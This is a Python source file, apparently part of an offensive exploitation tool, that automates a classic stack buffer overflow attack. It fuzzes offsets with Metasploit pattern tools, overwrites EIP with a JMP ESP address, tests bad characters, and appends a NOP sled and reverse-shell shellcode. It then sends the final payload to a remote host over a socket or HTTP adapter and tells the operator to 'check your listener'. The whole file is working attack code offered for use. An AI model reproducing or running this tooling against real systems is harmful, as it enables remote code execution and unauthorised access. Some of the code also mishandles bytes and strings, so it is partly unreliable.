import inspect
import logging
import subprocess
import sys
import socket
from struct import pack

from fast_overflow import FastOverflow
from utils.hexutil import HexUtil
from utils.system import *

class Classic:

    eip = ""
    esp = ""
    buffer = ""

    config = ""

    def __init__(self, config):
        self.config = config

        return None

    #################################
    # Classic Buffer Overflow Attributes & Function

    def fill_classic(self, offset):

        if (self.config.verbose_lv >= 1):
            print("[+] Filling stack at " + str(offset))

        if (sys.version_info >= (3, 0)):
            offset = ("A" * offset).encode('latin-1')
        else:
            offset = ("A" * offset)

        self.eip = ("B" * 4).encode('latin-1')
        self.esp = ("C" * 400).encode('latin-1')

        self.buffer = offset + self.eip + self.esp
        self.buffer += ("\r\n").encode('latin-1')

        return self.buffer

    def fill_classic_jmp_esp(self, offset, jmp_esp):

        if (sys.version_info >= (3, 0)):
            offset = ("A" * offset).encode('latin-1')
        else:
            offset = ("A" * offset)

        self.eip = pack('<L', int("0x" + jmp_esp, 16))

        self.esp = ("C" * 400).encode('latin-1')

        self.buffer = offset + self.eip + self.esp
        self.buffer += "\r\n"

        return self.buffer

    def fill_classic_bytearray(self, offset, jmp_esp):

        if (sys.version_info >= (3, 0)):
            offset = ("A" * offset).encode('latin-1')
            self.esp = System.bytearray.encode('latin-1')
        else:
            offset = ("A" * offset)
            self.esp = System.bytearray

        # offset = b"A" * offset

        self.eip = pack('<L', int("0x" + jmp_esp, 16))



        self.buffer = offset
        self.buffer += self.eip
        self.buffer += self.esp
        self.buffer += b"\r\n"

        # if(self.config.verbose_lv == 2):
        #     print(type(self.esp))

        return self.buffer

    def fill_classic_exploit(self, offset, jmp_esp, nops, payload):

        if (sys.version_info >= (3, 0)):
            offset = ("A" * offset).encode('latin-1')
        else:
            offset = ("A" * offset)

        # print(type(jmp_esp))
        # jmp_esp = jmp_esp.encode('windows-1252').decode()
        # print(type(jmp_esp))

        self.eip = pack('<L', int("0x" + str(jmp_esp), 16))

        if (self.config.verbose_lv >= 1):
            print(self.buffer)

        if (self.config.verbose_lv == 2):
            print(type(self.buffer))

        if (sys.version_info >= (3, 0)):
            if not isinstance(payload, str):
                self.esp = payload.decode('latin-1')
            else:
                self.esp = payload
        else:
            self.esp = payload

        self.buffer = offset + self.eip

        if nops > 0 or nops != None:
            if (self.config.verbose_lv == 2):
                print("\x90" * nops)
                print(type(("\x90" * nops)))

            if (sys.version_info >= (3, 0)):
                _nops = ("\x90" * nops).encode('latin-1')
            else:
                _nops = "\x90" * nops

            self.buffer += _nops

        print(self.buffer, type(self.buffer))
        self.buffer += self.esp.encode('latin1')
        #self.buffer += "\r\n"

        if (self.config.verbose_lv >= 1):
            print(self.buffer)

        if (self.config.verbose_lv == 2):
            print(type(self.buffer))

        # self.show_stack(self.config)

        return self.buffer

    def build_buffer(self):

        try :
            filename = System.input("[?] Enter filename to generate :")

            self.config.overflow = System.input("[?] How long do you want the pattern? :")
            print("[+] Generating pattern: msf-pattern_create -l %s" % self.config.overflow)

            buffer = subprocess.check_output(['msf-pattern_create', '-l', str(self.config.overflow)]).strip()

            System.file_write(filename, buffer)
            print("[!] Pattern saved to %s" % filename)

            eip_address = System.input("[?] Check the target debugger and enter EIP Value :")

            _offset = subprocess.check_output(['msf-pattern_offset', '-q', str(eip_address)])
            _offset = _offset.decode('latin-1').split('offset ')

            self.offset = int(_offset[len(_offset) - 1].strip())

            buffer = self.fill_classic(self.offset)
            System.file_write(filename, buffer)

            print("[+] Buffer is aligned in EIP and saved to %s" % filename)

            if (self.config.verbose_lv >= 1):
                print(buffer)

            self.config.jmpesp_add = System.input("[?] Inform JMP ESP address :")

            try:
                nops = int(System.input("[?] How many NOPS? [0] :"))
            except:
                nops = 0

            gonext = System.input("[?] Do you want to test or add custom badchars? [T]est/[A]dd/[S]kip] :")

            if (gonext == "T"):
                exploit = self.fill_classic_bytearray(self.offset, self.jmpesp_add)
                System.file_write(filename, exploit)
                print("[!] Your buffer is ready at %s" % filename)

            if(gonext != "S"):
                bads = System.input("[+] Default Badchars is " + ",".join(System.badchars) + ". Additional Badchars? Separate multiple HEX (without 0x) by commas (eg. 1a,40) :")

                if ',' in bads:
                    _bads = bads.split(',')
                    for _badchar in _bads:
                        System.badchars.append(r'\x' + _badchar)
                elif bads != "":
                    System.badchars.append(r'\x' + bads)

            self.config.badchars = System.badchars

            shellcode = System.shellcode(self.config)
            exploit = self.fill_classic_exploit(self.config.offset, self.config.jmpesp_add, self.config.nops,
                                                self.config.shellcode)

            System.file_write(filename, exploit)

            print("[!] Spawn listener on " + self.config.localip + ":" + str(self.config.localport))
            print("[!] Your buffer is ready at %s" % filename)

        except Exception as err:
            logging.exception(err)

    def exploit(self):
        try:
            adapter = System.get_adapter(self.config)

            if (self.config.mode == "file"):
                self.build_buffer()
                sys.exit(2)

            # stack = Stack()

            inject_func = getattr(adapter, 'inject')

            if(self.config.offset < 2 or self.config.offset == ""):
                System.generic_fuzzer(self.config)
            else:
                print("[!] Got from session OFFSET " + str(self.config.offset))

            # if self.config.offset < 2:
            #     gonext = "n"
            #     while gonext == "n":

            if (self.config.mode == "http"):
                buffer = adapter.make_request(self.config.remoteip, self.config.remoteport, self.config.field, self.fill_classic(self.config.offset),
                                              self.config.shellcode, self.offset)
            else:
                buffer = self.fill_classic(self.config.offset)

            # gonext = System.input("[?] Buffer is aligned in EIP: [Y]es/[N]o?")

            if (self.config.verbose_lv >= 1):
                print(buffer)

            #########################################################
            # GET JMP ADDRESS

            if(self.config.jmpesp_add == ""):

                _jmpesp_add = System.input("[?] Inform JMP ESP address or leave blank to continue:")

                if (_jmpesp_add == ""):
                    gonext = System.input("[!] All set! Press ENTER when your debugger is ready to receive a crafted buffer in EIP :")

                    inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)
                    print("[*] Buffer Injected (" + str(len(buffer)) + " bytes) to get JMP ESP!!!")

                    print("[!] Hint: !mona jmp -r esp -n")
                    self.config.jmpesp_add = System.input("[?] Check the target debugger and enter JMP ESP Address (without 0x) :")

                    if (self.config.mode == "http"):
                        buffer = adapter.make_request(self.config.remoteip, self.config.remoteport, self.config.field,
                                                      self.fill_classic_jmp_esp(self.config.offset, self.config.jmpesp_add),
                                                      self.config.shellcode, self.offset)
                    else:
                        buffer = self.fill_classic_jmp_esp(self.config.offset, self.config.jmpesp_add)

                    gonext = System.input("[!] All set! Press ENTER when your debugger is ready to receive a JMP ESP in EIP :")
                    inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)
                    print("[*] Buffer Injected (" + str(len(buffer)) + " bytes) to test STACK FILLING!!!")
                else:
                    self.config.jmpesp_add = _jmpesp_add

            else:
                print("[!] JMP ESP Address reloaded from previous sessions:" + self.config.jmpesp_add)

            #########################################################
            # NOPS

            try:
                _nops = -1
                while _nops == -1:
                    _nops = System.input("[?] How many NOPS [" + str(self.config.nops) + "] ?")
                    if _nops == "":
                        break
                    else:
                        self.config.nops = int(_nops)

            except:
                self.config.nops = 0

            #########################################################
            # BADCHARS

            if self.config.badchars == "":
                self.config.badchars = System.badchars
            else:
                System.badchars = self.config.badchars

            print ("[+] Badchars detected : " + ",".join(self.config.badchars))
            gonext = System.input("[?] Do you want to test or add custom badchars? [T]est/[A]dd/[S]kip:")

            if(gonext == "T"):
                if (self.config.mode == "http"):
                    exploit = adapter.make_request(self.config.remoteip, self.config.remoteport, self.config.field,
                                                  self.fill_classic_bytearray(self.config.offset, self.config.jmpesp_add),
                                                  self.config.shellcode, self.offset)
                else:
                    exploit = self.fill_classic_bytearray(self.config.offset, self.config.jmpesp_add)

                System.input("[?] Press any key when you wanna send the bytearray !!!")
                inject_func(self.config.remoteip, self.config.remoteport, self.config.field, exploit, True)

            if(gonext != "S"):
                bads = System.input("[+] Default Badchars is " + ",".join(System.badchars) + ". Additional Badchars? Separate multiple HEX (without 0x) by commas (eg. 1a,40) :")

                if ',' in bads:
                    _bads = bads.split(',')
                    for _badchar in _bads:
                        System.badchars.append(r'\x' + _badchar)
                elif bads != "":
                    System.badchars.append(r'\x' + bads)

            self.config.badchars = System.badchars

            #########################################################
            # SHELLCODE

            print("[!] Preparing Shellcode for reverse shell.....")

            self.config.shellcode = System.shellcode(self.config)

            if (self.config.mode == "http"):
                exploit = adapter.make_request(self.config.remoteip, self.config.remoteport, self.config.field,
                                               self.fill_classic_exploit(self.config.offset, self.config.jmpesp_add, self.config.nops, self.config.shellcode),
                                               self.config.shellcode, self.offset)
            else:
                exploit = self.fill_classic_exploit(self.config.offset, self.config.jmpesp_add, self.config.nops, self.config.shellcode)

            print("[!] Spawn listener on " + self.config.localip + ":" + str(self.config.localport))
            gonext = System.input("[?] Press any key when you wanna give the shot!!! This will send the FINAL PAYLOAD now!!!")

            inject_func(self.config.remoteip, self.config.remoteport, self.config.field, exploit, True)
            print("[*] Buffer Injected (" + str(len(exploit)) + " bytes)!!!")
            print("[*] Check your listener!!!")

            save = System.input("[?] Do you want to save your progress data? [Y]es/[n]o")
            if save == "Y":
                System.save_session(self.config)

        except Exception as err:
            logging.exception(err)
            # Output error, and return with an error code
            # print((err))
            #
            # #  Python 2
            # print 'Error on line {}'.format(sys.exc_info()[0].tb_lineno)
            #  Python 3
            #print("Error on line {}".format(sys.exc_info()[-1].tb_lineno))

            #sys.exit(2)
            # except Exception as e:
            # 	if hasattr(e, 'message'):
            # 		print(e.message)
            # 	else:
            # 		print(e)